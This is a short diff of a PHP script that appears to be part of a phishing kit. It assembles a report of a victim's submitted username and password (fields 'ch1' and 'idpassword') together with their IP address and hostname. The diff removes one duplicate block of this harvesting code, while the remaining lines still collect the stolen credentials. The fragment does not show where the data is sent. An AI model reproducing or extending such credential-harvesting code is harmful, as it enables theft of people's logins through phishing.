@@ -9,10 +9,6 @@ $bilsmg .= " PWD:           : ".$_POST['idpassword']."\n";
 $bilsmg .= " isp|: $ip | $hostname\n";
 $bilsmg .= "------------------------------------\n";
 
-$message .= "---".$_POST['ZAG']."---\n";
-$message .= " USR|: ".$_POST['ch1']."\n";
-$message .= " PWD|: ".$_POST['idpassword']."\n";
-$message .= " isp|: $ip | $hostname\n";
 
 
 
